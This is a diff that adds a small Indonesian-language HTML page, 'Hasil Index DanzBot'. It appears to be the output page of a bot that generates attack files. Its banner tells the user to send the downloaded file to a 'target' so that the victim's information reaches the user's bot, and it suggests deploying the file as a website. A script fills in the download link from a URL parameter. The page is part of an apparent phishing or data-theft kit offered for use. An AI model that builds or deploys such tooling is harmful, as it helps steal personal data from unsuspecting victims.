@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hasil Index DanzBot</title>
+  <style>
+    body {
+      background: black;
+      color: red;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 60px;
+    }
+    a {
+      background: red;
+      color: white;
+      padding: 12px 30px;
+      text-decoration: none;
+      border-radius: 10px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <h1>✅file siap di pakai & di kirim ke target
+,kirim ke target dan info akan terkirim di bot lu</h1>
+  <h1>download & kirim ke target,jika mau deploy jadi web deploy kan saja</h1>
+  <img src="https://files.catbox.moe/3zfugo.png" width="150"><br><br>
+  <a id="download" download="index.html">⬇️ Download</a>
+
+  <script>
+    const file = new URLSearchParams(window.location.search).get("file");
+    if (file) {
+      document.getElementById("download").href = file;
+    } else {
+      document.body.innerHTML = "<h2>❌ file tidak ditemukan.</h2>";
+    }
+  </script>
+</body>
+</html>
